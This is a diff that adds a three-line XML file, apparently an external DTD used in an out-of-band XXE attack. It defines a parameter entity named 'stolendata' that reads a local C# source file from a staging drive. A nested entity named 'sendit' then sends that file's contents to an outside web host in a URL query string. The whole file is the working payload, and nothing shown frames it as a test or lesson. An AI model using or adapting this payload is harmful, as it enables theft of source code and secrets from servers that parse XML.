@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % stolendata SYSTEM "file:///D:/al-staging/AccountLink.Modules.Sales/Business/FundImportManager.cs">
+<!ENTITY % inception "<!ENTITY % sendit SYSTEM 'https://lautarocolombo.com/?%stolendata;'>">
